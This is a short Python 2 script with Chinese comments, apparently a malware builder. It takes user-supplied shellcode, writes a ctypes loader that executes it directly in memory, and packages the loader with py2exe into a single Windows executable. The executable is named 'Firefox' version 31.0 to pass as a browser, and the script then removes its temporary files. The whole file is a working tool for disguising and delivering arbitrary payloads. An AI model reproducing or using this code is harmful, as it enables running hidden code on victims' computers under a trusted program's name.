#!/usr/bin/env python
# -*- coding:utf-8 -*-

import os
import py2exe
import shutil
import sys
from distutils.core import setup


def write_py(shellcode):
    """
    将 shellcode 写入临时文件
    :param shellcode: shellcode
    :type shellcode: str
    :return: 是否写入成功
    :rtype: bool
    """
    with open("shellcode.py", "w") as tmp:
        code = ""
        code += "import ctypes" + os.linesep
        code += ("buf = '%s'" % shellcode) + os.linesep
        code += "shellcode_buffer = ctypes.create_string_buffer(buf, len(buf))" + os.linesep
        code += "shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))" + os.linesep
        code += "shellcode_func()"
        tmp.write(code)

        return True


def clean():
    """
    清理临时文件
    """
    os.remove("shellcode.py")
    shutil.rmtree("build")
    shutil.move("dist", "output")


def main():
    shellcode = raw_input("[*]Enter your shellcode: " + os.linesep)
    print "[*]Writing shellcode.py..."
    if write_py(shellcode):
        print "[+]Success"
        print "[*]Packaging to an PE file..."
        sys.argv.append("py2exe")
        py2exe_options = {
            "dll_excludes": ["MSVCP90.dll", ],
            "compressed": 1,
            "optimize": 2,
            "ascii": 0,
            "bundle_files": 1,
        }
        setup(
            name='Firefox',
            version='31.0',
            windows=["shellcode.py"],
            zipfile=None,
            options={'py2exe': py2exe_options}
        )
        print "[+]Success"
        print "[*]Cleaning tmp files..."
        clean()
        print "[+]Success"
        print "[+]All done! Have fun!"
    else:
        print "[!]Write file failed."

if __name__ == "__main__":
    main()
